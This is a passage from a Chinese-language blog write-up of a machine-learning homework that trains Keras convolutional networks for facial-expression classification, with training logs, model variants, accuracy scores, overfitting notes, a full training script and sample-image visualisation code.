[==============================] - 78s 3ms/step - loss: 0.3915 - acc: 0.8592</span><br><span class="line">Epoch 16/20</span><br><span class="line">28709/28709 [==============================] - 76s 3ms/step - loss: 0.3626 - acc: 0.8690</span><br><span class="line">Epoch 17/20</span><br><span class="line">28709/28709 [==============================] - 76s 3ms/step - loss: 0.3190 - acc: 0.8858</span><br><span class="line">Epoch 18/20</span><br><span class="line">28709/28709 [==============================] - 76s 3ms/step - loss: 0.3013 - acc: 0.8930</span><br><span class="line">Epoch 19/20</span><br><span class="line">28709/28709 [==============================] - 76s 3ms/step - loss: 0.2744 - acc: 0.9027</span><br><span class="line">Epoch 20/20</span><br><span class="line">28709/28709 [==============================] - 77s 3ms/step - loss: 0.2455 - acc: 0.9124</span><br><span class="line">28709/28709 [==============================] - 11s 380us/step</span><br><span class="line"></span><br><span class="line">Train Acc: 0.9182486253005799</span><br></pre></td></tr></table></figure></p><p>batch_size差不多是多少个数据更新一次参数，过大就没啥效果，过小梯度可能就会出现问题</p><p>于是我又调了一下参数，顺便加了一层Conv2D<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">model = Sequential()</span><br><span class="line">model.add(Conv2D(<span class="number">25</span>, (<span class="number">6</span>, <span class="number">6</span>), input_shape=(x_train.shape[<span class="number">1</span>], x_train.shape[<span class="number">2</span>], x_train.shape[<span class="number">3</span>])))</span><br><span class="line">model.add(MaxPooling2D((<span class="number">2</span>, <span class="number">2</span>)))</span><br><span class="line">model.add(Conv2D(<span class="number">25</span>, (<span class="number">6</span>, <span class="number">6</span>)))</span><br><span class="line">model.add(MaxPooling2D((<span class="number">2</span>, <span class="number">2</span>)))</span><br><span class="line">model.add(Flatten())</span><br><span class="line">model.add(Dense(output_dim = <span class="number">100</span>))</span><br><span class="line">model.add(Activation(<span class="string">'relu'</span>))</span><br><span class="line">model.add(Dense(output_dim = <span class="number">7</span>))</span><br><span class="line">model.add(Activation(<span class="string">'softmax'</span>))</span><br><span class="line">model.compile(loss=<span class="string">'categorical_crossentropy'</span>, optimizer=<span class="string">'adam'</span>, metrics=[<span class="string">'accuracy'</span>])</span><br><span class="line">model.fit(x_train, y_train, batch_size = <span class="number">100</span>, epochs = <span class="number">20</span>)</span><br></pre></td></tr></table></figure></p><p>结果变好了一点<code>private:0.49651 public:0.50766</code><br>但是在Training Data上面的准确率居然可以到<code>0.94</code>？？？是不是Overfitted了</p><p>我增加了验证集，确实是Overfitted了<br>既然the deeper the better，那么我把他改的比较Deep了,然后可能参数过多了…train了40+min，结果正确率没变…跟蒙的正确率差不多…</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">train</span><span class="params">(x_train, y_train, x_val, y_val)</span>:</span></span><br><span class="line">    model = Sequential()</span><br><span class="line">    model.add(Conv2D(<span class="number">32</span>, (<span class="number">3</span>, <span class="number">3</span>), input_shape=(x_train.shape[<span class="number">1</span>], x_train.shape[<span class="number">2</span>], x_train.shape[<span class="number">3</span>])))</span><br><span class="line">    model.add(Conv2D(<span class="number">32</span>, (<span class="number">3</span>, <span class="number">3</span>)))</span><br><span class="line">    model.add(MaxPooling2D((<span class="number">2</span>, <span class="number">2</span>)))</span><br><span class="line">    model.add(Conv2D(<span class="number">64</span>, (<span class="number">3</span>, <span class="number">3</span>)))</span><br><span class="line">    model.add(MaxPooling2D((<span class="number">2</span>, <span class="number">2</span>)))</span><br><span class="line">    model.add(Conv2D(<span class="number">64</span>, (<span class="number">2</span>, <span class="number">2</span>)))</span><br><span class="line">    model.add(MaxPooling2D((<span class="number">2</span>, <span class="number">2</span>)))</span><br><span class="line">    model.add(Conv2D(<span class="number">64</span>, (<span class="number">2</span>, <span class="number">2</span>)))</span><br><span class="line">    model.add(MaxPooling2D((<span class="number">2</span>, <span class="number">2</span>)))</span><br><span class="line">    model.add(Flatten())</span><br><span class="line">    model.add(Dense(output_dim = <span class="number">100</span>))</span><br><span class="line">    <span class="comment">#model.add(Dropout(0.3))</span></span><br><span class="line">    model.add(Activation(<span class="string">'relu'</span>))</span><br><span class="line">    model.add(Dense(output_dim = <span class="number">7</span>))</span><br><span class="line">    model.add(Activation(<span class="string">'softmax'</span>))</span><br><span class="line">    model.compile(loss=<span class="string">'categorical_crossentropy'</span>, optimizer=<span class="string">'adam'</span>, metrics=[<span class="string">'accuracy'</span>])</span><br><span class="line">    model.fit(x_train, y_train, batch_size = <span class="number">200</span>, epochs = <span class="number">10</span>)</span><br><span class="line">    result = model.evaluate(x_train, y_train, batch_size=<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">'\nTrain Acc:'</span>, result[<span class="number">1</span>])</span><br><span class="line">    result = model.evaluate(x_val, y_val, batch_size=<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">'\nVal Acc:'</span>, result[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">return</span> model</span><br></pre></td></tr></table></figure><p>结果还是不理想<br><code>Train Acc: 0.4293785310734463 Val Acc: 0.38791915480018374</code>.<br><code>private 0.38088 public:0.40011</code>.</p><p>train一次真的好久…<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">train</span><span class="params">(x_train, y_train, x_val, y_val)</span>:</span></span><br><span class="line">    model = Sequential()</span><br><span class="line">    model.add(Conv2D(<span class="number">32</span>, (<span class="number">3</span>, <span class="number">3</span>), input_shape=(x_train.shape[<span class="number">1</span>], x_train.shape[<span class="number">2</span>], x_train.shape[<span class="number">3</span>])))</span><br><span class="line">    model.add(MaxPooling2D((<span class="number">2</span>, <span class="number">2</span>)))</span><br><span class="line">    model.add(Conv2D(<span class="number">64</span>, (<span class="number">3</span>, <span class="number">3</span>)))</span><br><span class="line">    model.add(MaxPooling2D((<span class="number">2</span>, <span class="number">2</span>)))</span><br><span class="line">    model.add(Conv2D(<span class="number">64</span>, (<span class="number">2</span>, <span class="number">2</span>)))</span><br><span class="line">    model.add(MaxPooling2D((<span class="number">2</span>, <span class="number">2</span>)))</span><br><span class="line">    <span class="comment">#model.add(Conv2D(64, (2, 2)))</span></span><br><span class="line">    <span class="comment">#model.add(MaxPooling2D((2, 2)))</span></span><br><span class="line">    model.add(Flatten())</span><br><span class="line">    model.add(Dense(output_dim = <span class="number">100</span>))</span><br><span class="line">    model.add(Dropout(<span class="number">0.3</span>))</span><br><span class="line">    model.add(Activation(<span class="string">'relu'</span>))</span><br><span class="line">    model.add(Dense(output_dim = <span class="number">7</span>))</span><br><span class="line">    model.add(Activation(<span class="string">'softmax'</span>))</span><br><span class="line">    <span class="comment">#model.compile(loss='categorical_crossentropy', optimizer=SGD(lr=0.1), metrics=['accuracy'])</span></span><br><span class="line">    model.compile(loss=<span class="string">'categorical_crossentropy'</span>, optimizer=<span class="string">'adam'</span>, metrics=[<span class="string">'accuracy'</span>])</span><br><span class="line">    </span><br><span class="line">    model.fit(x_train, y_train, batch_size = <span class="number">200</span>, epochs = <span class="number">10</span>)</span><br><span class="line">    result = model.evaluate(x_train, y_train, batch_size=<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">'\nTrain Acc:'</span>, result[<span class="number">1</span>])</span><br><span class="line">    result = model.evaluate(x_val, y_val, batch_size=<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">'\nVal Acc:'</span>, result[<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">return</span> model</span><br></pre></td></tr></table></figure></p><p><code>Train Acc: 0.5773211339433029Val Acc: 0.513435920992191</code>.<br><code>private: 0.49512 public:0.51518</code>.</p><p>把epochs改成30多Train一会<br><code>Train Acc: 0.9242537873106345 Val Acc: 0.5257234726688103</code>得分<code>private:0.51518 public:0.53998</code></p><p>我把之前的超复杂的model Train了100个epochs…结果没啥变化..噗…我可是train了5h 12-17 <code>private: 0.51908 public:0.53413</code><br><code>Train Acc: 0.9301534923253837 Val Acc: 0.5213596692696371</code>感觉又overfitted了？<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">train</span><span class="params">(x_train, y_train, x_val, y_val)</span>:</span></span><br><span class="line">    model = Sequential()</span><br><span class="line">    model.add(Conv2D(<span class="number">64</span>, (<span class="number">5</span>, <span class="number">5</span>), input_shape=(x_train.shape[<span class="number">1</span>], x_train.shape[<span class="number">2</span>], x_train.shape[<span class="number">3</span>])))</span><br><span class="line">    model.add(MaxPooling2D((<span class="number">2</span>, <span class="number">2</span>)))</span><br><span class="line">    model.add(BatchNormalization(axis = <span class="number">-1</span>))</span><br><span class="line">    model.add(Dropout(<span class="number">0.3</span>))</span><br><span class="line"></span><br><span class="line">    model.add(Conv2D(<span class="number">128</span>, (<span class="number">5</span>, <span class="number">5</span>)))</span><br><span class="line">    model.add(MaxPooling2D((<span class="number">2</span>, <span class="number">2</span>)))</span><br><span class="line">    model.add(BatchNormalization(axis = <span class="number">-1</span>))</span><br><span class="line">    model.add(Dropout(<span class="number">0.3</span>))</span><br><span class="line"></span><br><span class="line">    model.add(Conv2D(<span class="number">256</span>, (<span class="number">5</span>, <span class="number">5</span>)))</span><br><span class="line">    model.add(MaxPooling2D((<span class="number">2</span>, <span class="number">2</span>)))</span><br><span class="line">    model.add(BatchNormalization(axis = <span class="number">-1</span>))</span><br><span class="line">    model.add(Dropout(<span class="number">0.3</span>))</span><br><span class="line">    <span class="comment">#model.add(Conv2D(64, (2, 2)))</span></span><br><span class="line">    <span class="comment">#model.add(MaxPooling2D((2, 2)))</span></span><br><span class="line">    model.add(Flatten())</span><br><span class="line">    model.add(Dense(output_dim = <span class="number">128</span>))</span><br><span class="line">    model.add(Dropout(<span class="number">0.5</span>))</span><br><span class="line">    model.add(Activation(<span class="string">'relu'</span>))</span><br><span class="line">    model.add(Dense(output_dim = <span class="number">7</span>))</span><br><span class="line">    model.add(Activation(<span class="string">'softmax'</span>))</span><br><span class="line">    <span class="comment">#model.compile(loss='categorical_crossentropy', optimizer=SGD(lr=0.1), metrics=['accuracy'])</span></span><br><span class="line">    model.compile(loss=<span class="string">'categorical_crossentropy'</span>, optimizer=<span class="string">'adam'</span>, metrics=[<span class="string">'accuracy'</span>])</span><br><span class="line">    <span class="keyword">return</span> model</span><br></pre></td></tr></table></figure></p><p>吐了，train了一天，最好的结果<code>0.55642 public:0.56505</code>，改天来改改model再train8<br>—- Simple Baseline —-都没过orz</p><p>不管了，我一直train不起来，这是我最后train的一次model<br>主要是看<a href="https://github.com/JostineHo/mememoji" target="_blank" rel="noopener">这个</a>改了一下<br>怎么感觉是toolkit的问题…可能我姿势不太对？<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> keras.models <span class="keyword">import</span> Sequential</span><br><span class="line"><span class="keyword">from</span> keras.layers.core <span class="keyword">import</span> Dense, Dropout, Activation</span><br><span class="line"><span class="keyword">from</span> keras.layers <span class="keyword">import</span> Convolution2D, MaxPooling2D, Flatten, BatchNormalization</span><br><span class="line"><span class="keyword">from</span> keras.optimizers <span class="keyword">import</span> SGD, Adam</span><br><span class="line"><span class="keyword">from</span> keras.utils <span class="keyword">import</span> np_utils</span><br><span class="line"><span class="keyword">from</span> keras.models <span class="keyword">import</span> load_model</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">load_data</span><span class="params">()</span>:</span></span><br><span class="line">    train_f = open(<span class="string">'train.csv'</span>, <span class="string">'r'</span>)</span><br><span class="line">    test_f = open(<span class="string">'test.csv'</span>, <span class="string">'r'</span>)</span><br><span class="line">    train_data = train_f.readlines()[<span class="number">1</span>:]</span><br><span class="line">    test_data = test_f.readlines()[<span class="number">1</span>:]</span><br><span class="line">    </span><br><span class="line">    x_train = []</span><br><span class="line">    y_train = []</span><br><span class="line">    x_test = []</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(train_data)):</span><br><span class="line">        train_data[i]=train_data[i].split(<span class="string">','</span>)</span><br><span class="line">        x_train.append(train_data[i][<span class="number">1</span>].split(<span class="string">' '</span>))</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(len(x_train[i])):</span><br><span class="line">            x_train[i][j]=int(x_train[i][j])</span><br><span class="line">        y_train.append(int(train_data[i][<span class="number">0</span>]))</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(test_data)):</span><br><span class="line">        test_data[i]=test_data[i].split(<span class="string">','</span>)</span><br><span class="line">        x_test.append(test_data[i][<span class="number">1</span>].split(<span class="string">' '</span>))</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(len(x_test[i])):</span><br><span class="line">            x_test[i][j]=int(x_test[i][j])</span><br><span class="line">    </span><br><span class="line">    x = np.array(x_train)</span><br><span class="line">    y = np.array(y_train)</span><br><span class="line">    xx = np.array(x_test)</span><br><span class="line">    </span><br><span class="line">    x_train = x</span><br><span class="line">    y_train = y</span><br><span class="line">    x_test = xx</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># deal data</span></span><br><span class="line">    total_data = x_train.shape[<span class="number">0</span>]</span><br><span class="line">    x_train = x_train.reshape(total_data, <span class="number">48</span>, <span class="number">48</span>, <span class="number">1</span>)</span><br><span class="line">    x_test = x_test.reshape(x_test.shape[<span class="number">0</span>], <span class="number">48</span>, <span class="number">48</span>, <span class="number">1</span>)</span><br><span class="line">    x_train = x_train.astype(<span class="string">'float32'</span>)</span><br><span class="line">    x_test = x_test.astype(<span class="string">'float32'</span>)</span><br><span class="line">    x_train = x_train / <span class="number">255</span></span><br><span class="line">    x_test = x_test / <span class="number">255</span></span><br><span class="line">    </span><br><span class="line">    y_train = np_utils.to_categorical(y_train, <span class="number">7</span>)</span><br><span class="line">    </span><br><span class="line">    num = <span class="number">26000</span></span><br><span class="line">    x_val, y_val = x_train[num:, ], y_train[num:, ]</span><br><span class="line">    </span><br><span class="line">    x_train = x_train[:num, ]</span><br><span class="line">    y_train = y_train[:num, ]</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> x_train, y_train, x_val, y_val, x_test</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">train</span><span class="params">(x_train, y_train, x_val, y_val)</span>:</span></span><br><span class="line">    model = Sequential()</span><br><span class="line">    model.add(Convolution2D(<span class="number">32</span>, <span class="number">3</span>, <span class="number">3</span>, input_shape=(x_train.shape[<span class="number">1</span>], x_train.shape[<span class="number">2</span>], x_train.shape[<span class="number">3</span>])))</span><br><span class="line">    model.add(Convolution2D(<span class="number">32</span>, <span class="number">3</span>, <span class="number">3</span>, border_mode=<span class="string">'same'</span>, activation=<span class="string">'relu'</span>))</span><br><span class="line">    model.add(Convolution2D(<span class="number">32</span>, <span class="number">3</span>, <span class="number">3</span>, border_mode=<span class="string">'same'</span>, activation=<span class="string">'relu'</span>))</span><br><span class="line">    model.add(MaxPooling2D(pool_size=(<span class="number">2</span>, <span class="number">2</span>)))</span><br><span class="line">    </span><br><span class="line">    model.add(Convolution2D(<span class="number">64</span>, <span class="number">3</span>, <span class="number">3</span>, border_mode=<span class="string">'same'</span>, activation=<span class="string">'relu'</span>))</span><br><span class="line">    model.add(Convolution2D(<span class="number">64</span>, <span class="number">3</span>, <span class="number">3</span>, border_mode=<span class="string">'same'</span>, activation=<span class="string">'relu'</span>))</span><br><span class="line">    model.add(Convolution2D(<span class="number">64</span>, <span class="number">3</span>, <span class="number">3</span>, border_mode=<span class="string">'same'</span>, activation=<span class="string">'relu'</span>))</span><br><span class="line">    model.add(MaxPooling2D(pool_size=(<span class="number">2</span>, <span class="number">2</span>)))</span><br><span class="line">    </span><br><span class="line">    model.add(Convolution2D(<span class="number">128</span>, <span class="number">3</span>, <span class="number">3</span>, border_mode=<span class="string">'same'</span>, activation=<span class="string">'relu'</span>))</span><br><span class="line">    model.add(Convolution2D(<span class="number">128</span>, <span class="number">3</span>, <span class="number">3</span>, border_mode=<span class="string">'same'</span>, activation=<span class="string">'relu'</span>))</span><br><span class="line">    model.add(Convolution2D(<span class="number">128</span>, <span class="number">3</span>, <span class="number">3</span>, border_mode=<span class="string">'same'</span>, activation=<span class="string">'relu'</span>))</span><br><span class="line">    model.add(MaxPooling2D(pool_size=(<span class="number">2</span>, <span class="number">2</span>)))</span><br><span class="line">    </span><br><span class="line">    model.add(Flatten())</span><br><span class="line">    model.add(Dense(units = <span class="number">64</span>, activation=<span class="string">'relu'</span>))</span><br><span class="line">    model.add(Dropout(<span class="number">0.5</span>))</span><br><span class="line">    model.add(Dense(units = <span class="number">64</span>, activation=<span class="string">'relu'</span>))</span><br><span class="line">    model.add(Dropout(<span class="number">0.5</span>))</span><br><span class="line">        </span><br><span class="line">    model.add(Dense(units = <span class="number">7</span>, activation=<span class="string">'softmax'</span>))</span><br><span class="line">    <span class="comment">#model.compile(loss='categorical_crossentropy', optimizer=SGD(lr=0.1), metrics=['accuracy'])</span></span><br><span class="line">    model.compile(loss=<span class="string">'categorical_crossentropy'</span>, optimizer=<span class="string">'adam'</span>, metrics=[<span class="string">'accuracy'</span>])</span><br><span class="line">    </span><br><span class="line">    model.fit(x_train, y_train, nb_epoch=<span class="number">50</span>, batch_size=<span class="number">128</span>,</span><br><span class="line">          validation_split=<span class="number">0.3</span>, shuffle=<span class="keyword">True</span>, verbose=<span class="number">1</span>)</span><br><span class="line">    model.save(<span class="string">'my_model.h5'</span>)</span><br><span class="line">    loss_and_metrics = model.evaluate(x_train, y_train, batch_size=<span class="number">128</span>, verbose=<span class="number">1</span>)</span><br><span class="line">    print(<span class="string">'Done!'</span>)</span><br><span class="line">    print(<span class="string">'Loss: '</span>, loss_and_metrics[<span class="number">0</span>])</span><br><span class="line">    print(<span class="string">' Acc: '</span>, loss_and_metrics[<span class="number">1</span>])</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> model</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">test</span><span class="params">(model, x_test)</span>:</span></span><br><span class="line">    y_test = model.predict(x_test)</span><br><span class="line">    test_f = open(<span class="string">'y_test.csv'</span>, <span class="string">'w'</span>)</span><br><span class="line">    print(<span class="string">'id,label'</span>, file=test_f)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(y_test)):</span><br><span class="line">        print(i, np.argmax(y_test[i]), sep=<span class="string">','</span>, file=test_f)</span><br><span class="line">    test_f.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    x_train, y_train, x_val, y_val, x_test = load_data()</span><br><span class="line">    print(<span class="string">'load_data() ok'</span>)</span><br><span class="line">    model = train(x_train, y_train, x_val, y_val)</span><br><span class="line">    </span><br><span class="line">    print(<span class="string">'train() ok'</span>)</span><br><span class="line">    test(model, x_test)</span><br><span class="line">    print(<span class="string">'test() ok'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></p><h3 id="Data"><a href="#Data" class="headerlink" title="Data"></a>Data</h3><p>最后来做一下，有趣的数据和Model的可视化</p><p>training data前十张图片</p><style>.img-wrap{    border: 1px }img{    float: left;    width: 20%;}</style><div class="img-wrap"><img src="/img/ml-practice/hw3/pic0.jpg"><img src="/img/ml-practice/hw3/pic1.jpg"><img src="/img/ml-practice/hw3/pic2.jpg"><img src="/img/ml-practice/hw3/pic3.jpg"><img src="/img/ml-practice/hw3/pic4.jpg"></div><div class="img-wrap"><img src="/img/ml-practice/hw3/pic5.jpg"><img src="/img/ml-practice/hw3/pic6.jpg"><img src="/img/ml-practice/hw3/pic7.jpg"><img src="/img/ml-practice/hw3/pic8.jpg"><img src="/img/ml-practice/hw3/pic9.jpg"></div><p>标签分别是<br>0 Angry 1 Angry 2 Fear 3 Sad 4 Neutral<br>5 Fear 6 Sad 7 Happy 8 Happy 9 Fear</p><p>test data前十张照片</p><div class="img-wrap"><img src="/img/ml-practice/hw3/test_pic0.jpg"><img src="/img/ml-practice/hw3/test_pic1.jpg"><img src="/img/ml-practice/hw3/test_pic2.jpg"><img src="/img/ml-practice/hw3/test_pic3.jpg"><img src="/img/ml-practice/hw3/test_pic4.jpg"></div><div class="img-wrap"><img src="/img/ml-practice/hw3/test_pic5.jpg"><img src="/img/ml-practice/hw3/test_pic6.jpg"><img src="/img/ml-practice/hw3/test_pic7.jpg"><img src="/img/ml-practice/hw3/test_pic8.jpg"><img src="/img/ml-practice/hw3/test_pic9.jpg"></div><p>我给出了y_test<br>0 Happy 1 Happy 2 Happy 3 Happy 4 Neutral<br>5 Surprise 6 Angry 7 Neutral 8 Fear 9 Neutral</p><p>感觉还挺对的啊233<br>相关代码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(x_train, y_train, x_val, y_val, x_test)</span>:</span></span><br><span class="line">    emo = [<span class="string">'Angry'</span>, <span class="string">'Disgust'</span>, <span class="string">'Fear'</span>, <span class="string">'Happy'</span>,</span><br><span class="line">           <span class="string">'Sad'</span>, <span class="string">'Surprise'</span>, <span class="string">'Neutral'</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        plt.imshow(x_train[i])</span><br><span class="line">        plt.axis(<span class="string">'off'</span>)</span><br><span class="line">        plt.savefig(<span class="string">'pic'</span>+str(i)+<span class="string">'.jpg'</span>)</span><br><span class="line">        plt.show()</span><br><span class="line">        print(i, emo[y_train[i]])</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10</span>):</span><br><span class="line">        plt.imshow(x_test[i])</span><br><span class="line">        plt.axis(<span class="string">'off'</span>)</span><br><span class="line">        plt.savefig(<span class="string">'test_pic'</span>+str(i)+<span class="string">'.jpg'</span>)</span><br><span class="line">        plt.show()</span><br></pre></td></tr></table></figure></p><p>下面就是有关Model的部分</p><p>这是train出最好结果的Model结构<code>print(model.summary())</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">Layer (type)                 Output Shape              Param #   </span><br><span class="line">=================================================================</span><br><span class="line">conv2d_1 (Conv2D)            (None, 44, 44, 32)        832       </span><br><span class="line">_________________________________________________________________</span><br><span class="line">max_pooling2d_1 (MaxPooling2 (None, 22, 22, 32)        0         </span><br><span class="line">_________________________________________________________________</span><br><span class="line">batch_normalization_1 (Batch (None, 22, 22, 32)        128       </span><br><span class="line">_________________________________________________________________</span><br><span class="line">dropout_1 (Dropout)          (None, 22, 22, 32)        0         </span><br><span class="line">_________________________________________________________________</span><br><span class="line">conv2d_2 (Conv2D)            (None, 18, 18, 64)        51264     </span><br><span class="line">_________________________________________________________________</span><br><span class="line">max_pooling2d_2 (MaxPooling2 (None, 9, 9, 64)          0         </span><br><span class="line">_________________________________________________________________</span><br><span class="line">batch_normalization_2 (Batch (None, 9, 9, 64)          256       </span><br><span class="line">_________________________________________________________________</span><br><span class="line">dropout_2 (Dropout)          (None, 9, 9, 64)          0         </span><br><span class="line">_________________________________________________________________</span><br><span class="line">conv2d_3 (Conv2D)            (None, 7, 7, 128)         73856     </span><br><span class="line">_________________________________________________________________</span><br><span class="line">max_pooling2d_3 (MaxPooling2 